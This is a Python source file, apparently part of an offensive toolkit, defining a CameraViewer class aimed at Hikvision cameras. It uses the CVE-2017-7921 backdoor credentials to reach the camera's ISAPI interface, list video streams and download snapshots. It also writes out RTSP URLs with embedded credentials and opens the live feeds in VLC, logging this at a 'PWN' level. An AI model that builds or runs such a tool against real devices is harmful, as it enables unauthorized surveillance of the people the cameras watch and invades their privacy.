"""عرض الكاميرات — يعتمد على modules.hikvision_snapshots (نفس منطق test.py)."""

from __future__ import annotations

import os
import subprocess
from urllib.parse import quote

from engines.hikvision_snapshots import (
    DEFAULT_PASSWORD,
    DEFAULT_USER,
    HIKVISION_BACKDOOR_CREDS,
    discover_streams,
    download_all_snapshots,
    download_backdoor_snapshots,
    find_isapi_base,
    pick_snapshot_stream_ids,
)
from engines.utils import get_target_dir, log
import requests
import urllib3

urllib3.disable_warnings()


class CameraViewer:
    def __init__(
        self,
        target_ip: str,
        username: str = DEFAULT_USER,
        password: str = DEFAULT_PASSWORD,
        *,
        use_backdoor_auth: bool = False,
    ):
        self.target_ip = target_ip.strip()
        self.username = username
        self.password = password
        self.use_backdoor_auth = use_backdoor_auth
        self.auth = HIKVISION_BACKDOOR_CREDS if use_backdoor_auth else (username, password)
        self.t_dir = get_target_dir(self.target_ip)
        self.channels: list[str] = []
        self._stream_ids: list[int] = []
        self._base_url: str | None = None

    def discover_channels(self) -> list[str]:
        log(f"Discovering camera channels on {self.target_ip}...", "INFO")
        base, msg, use_backdoor = find_isapi_base(
            self.target_ip, self.auth, port_hint=80, https=False, timeout=15.0
        )
        if not base:
            log(msg.replace("\n", " "), "ERROR")
            return []

        self.use_backdoor_auth = use_backdoor
        self._base_url = base
        session = requests.Session()
        streams, inputs, dev = discover_streams(session, base, self.auth, 15.0, use_backdoor=use_backdoor)
        picked = pick_snapshot_stream_ids(streams)

        self._stream_ids = [s.stream_id for s in picked]
        self.channels = [str(s.stream_id // 100) for s in picked]

        if dev:
            log(f"Device: {dev.device_type} / {dev.model}", "INFO")
        if use_backdoor:
            log("Using CVE-2017-7921 backdoor auth for ISAPI requests.", "SUCCESS")
        log(f"Found {len(self.channels)} unique input(s): streams {self._stream_ids}", "SUCCESS")
        return self.channels

    def take_snapshots(self) -> list[str]:
        if not self._stream_ids:
            self.discover_channels()

        snapshots_dir = os.path.join(self.t_dir, "snapshots")
        paths = download_all_snapshots(
            self.target_ip,
            self.auth[0],
            self.auth[1],
            output_dir=snapshots_dir,
            port=80,
            force_scan=False,
        )
        if not paths and self.use_backdoor_auth:
            log("ISAPI unavailable — fetching snapshots via CVE-2017-7921 backdoor...", "INFO")
            paths = download_backdoor_snapshots(
                self.target_ip,
                snapshots_dir,
                port=80,
            )
        return [str(p) for p in paths]

    def get_rtsp_urls(self) -> list[dict]:
        if not self._stream_ids:
            self.discover_channels()

        pw = quote(self.auth[1], safe="")
        rtsp_urls = []
        for sid in self._stream_ids:
            ch = sid // 100
            main = (
                f"rtsp://{self.auth[0]}:{pw}@"
                f"{self.target_ip}:554/Streaming/Channels/{sid}"
            )
            sub_id = ch * 100 + 2
            sub = (
                f"rtsp://{self.auth[0]}:{pw}@"
                f"{self.target_ip}:554/Streaming/Channels/{sub_id}"
            )
            rtsp_urls.append({"channel": str(ch), "main": main, "sub": sub})
        return rtsp_urls

    def open_in_vlc(self, use_sub_stream: bool = False) -> None:
        rtsp_urls = self.get_rtsp_urls()
        if not rtsp_urls:
            log("No cameras found to open.", "ERROR")
            return

        playlist_file = os.path.join(self.t_dir, "cameras_playlist.m3u")
        with open(playlist_file, "w", encoding="utf-8") as f:
            f.write("#EXTM3U\n")
            for cam in rtsp_urls:
                stream = cam["sub"] if use_sub_stream else cam["main"]
                f.write(f"#EXTINF:-1,Camera {cam['channel']}\n{stream}\n")

        log(f"Playlist saved: {playlist_file}", "SUCCESS")

        from engines.vlc_utils import find_vlc

        vlc_exe = find_vlc()
        if not vlc_exe:
            log("VLC not found. Open playlist manually.", "ERROR")
            for cam in rtsp_urls:
                print(f"  Camera {cam['channel']}: {cam['main']}")
            return

        log(f"Opening {len(rtsp_urls)} stream(s) in VLC...", "PWN")
        subprocess.Popen([vlc_exe, playlist_file])

    def print_summary(self) -> None:
        rtsp_urls = self.get_rtsp_urls()
        print("\n" + "=" * 60)
        print(f"  CAMERA SUMMARY - {self.target_ip}")
        print(f"  Total Cameras: {len(rtsp_urls)}")
        print("=" * 60)
        for cam in rtsp_urls:
            print(f"  Camera {cam['channel']}:")
            print(f"    Main: {cam['main']}")
            print(f"    Sub:  {cam['sub']}")
        print("=" * 60 + "\n")
